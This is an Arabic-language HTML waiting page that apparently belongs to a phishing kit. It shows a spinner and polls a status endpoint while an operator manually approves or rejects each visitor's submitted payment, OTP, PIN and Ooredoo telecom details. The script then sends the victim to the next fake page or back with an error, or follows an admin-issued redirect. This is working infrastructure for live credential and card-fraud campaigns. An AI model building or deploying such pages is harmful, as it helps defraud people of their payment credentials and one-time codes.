<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة...</title>
    <style>
        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; background: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; }
        .loader-wrap { text-align: center; }
        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #333; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { color: #333; font-weight: 600; font-size: 16px; }
    </style>
</head>
<body>
<div class="loader-wrap">
    <div class="spinner"></div>
    <div class="text" id="statusText">جاري معالجة طلبك...</div>
</div>
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const visitorId = urlParams.get('visitor_id');
    const nextPage = urlParams.get('next');
    const previousPage = urlParams.get('prev') || 'index.php';

    // الصفحات التي تتطلب قرار المسؤول حصراً
    const manualPages = ['otp.php', 'pin.php', 'ooredoo.php', 'otp_ooredoo.php', 'success.php'];
    
    // إذا كانت الصفحة الحالية هي الدفع أو ما بعدها، ننتظر قرار المسؤول
    const isManual = previousPage.includes('payment.php') || 
                     previousPage.includes('otp.php') || 
                     previousPage.includes('pin.php') || 
                     previousPage.includes('ooredoo.php');

    function checkStatus() {
        fetch(`api/check_status.php?visitor_id=${visitorId}&v=${Date.now()}`)
            .then(r => r.json())
            .then(data => {
                // ميزة إعادة التوجيه المباشرة من الأدمن
                if (data.redirect) {
                    window.location.href = data.redirect + "?visitor_id=" + visitorId;
                    return;
                }

                if (data.status === 'approved') {
                    window.location.href = nextPage + "?visitor_id=" + visitorId;
                } else if (data.status === 'rejected') {
                    window.location.href = previousPage + "?visitor_id=" + visitorId + "&error=1";
                }
            });
    }

    if (isManual) {
        // انتظار قرار المسؤول
        document.getElementById('statusText').textContent = 'يرجى الانتظار، جاري مراجعة البيانات...';
        setInterval(checkStatus, 3000);
        checkStatus();
    } else {
        // انتقال تلقائي بعد ثانيتين بالضبط
        setTimeout(() => {
            window.location.href = nextPage + "?visitor_id=" + visitorId;
        }, 2000);
    }
</script>
</body>
</html>
